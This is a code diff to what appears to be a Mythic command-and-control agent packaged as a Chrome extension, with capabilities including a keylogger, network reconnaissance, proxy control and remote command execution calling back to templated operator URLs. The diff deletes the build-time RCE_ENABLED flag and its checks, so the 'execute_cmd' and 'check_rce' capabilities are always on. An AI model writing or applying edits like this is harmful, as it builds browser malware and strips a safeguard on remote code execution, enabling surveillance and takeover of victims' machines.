@@ -19,7 +19,6 @@ const AES_PSK = "{{AESPSK}}";
 const GET_URL = "{{GET_URL}}";
 const POST_URL = "{{POST_URL}}";
 const QUERY_PARAM = "{{QUERY_PARAM}}";
-const RCE_ENABLED = {{ENABLE_RCE}}; // true only when built with enable_rce=true
 
 let CALLBACK_UUID = MYTHIC_UUID; // updated after checkin
 
@@ -34,7 +33,7 @@ const CAPABILITIES = [
   "stop_keylogger", "network_recon", "get_notification", "send_notification",
   "send_notification_v2", "set_notification", "enable_proxy",
   "disable_proxy", "proxy_set_rules",
-  ...(RCE_ENABLED ? ["execute_cmd", "check_rce"] : []),
+  "execute_cmd", "check_rce",
 ];
 
 // ---------------------------------------------------------------------------
@@ -1576,10 +1575,6 @@ async function handleTask(task) {
       break;
     }
     case "execute_cmd": {
-      if (!RCE_ENABLED) {
-        output = JSON.stringify({ error: "rce_disabled" });
-        break;
-      }
       const command = params.command || "";
       if (!command) {
         output = JSON.stringify({ error: "missing_cmd" });
@@ -1608,10 +1603,6 @@ async function handleTask(task) {
       break;
     }
     case "check_rce": {
-      if (!RCE_ENABLED) {
-        output = JSON.stringify({ error: "rce_disabled" });
-        break;
-      }
       output = await new Promise((resolve) => {
         try {
           chrome.runtime.sendNativeMessage(
